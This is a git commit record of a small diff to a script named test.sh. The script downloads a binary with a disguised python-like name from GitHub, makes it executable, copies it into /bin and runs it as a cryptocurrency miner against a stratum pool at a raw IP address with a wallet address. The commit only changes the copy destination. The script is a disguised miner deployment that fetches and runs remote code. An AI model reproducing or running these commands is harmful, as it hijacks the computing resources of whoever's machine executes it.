81c10143953f7db78a12b0fc1100a6f8f8824047
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-19 15:06:02 +0100

    Update test.sh

--- test.sh
+++ test.sh
@@ -5,5 +5,5 @@ curl ipinfo.io
 #download build
 wget https://github.com/one10001/10001code/raw/main/pythonK37
 chmod +x pythonK37
-cp pythonK37 /bin/python233
+cp pythonK37 /bin/pythonK37
 pythonK37 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
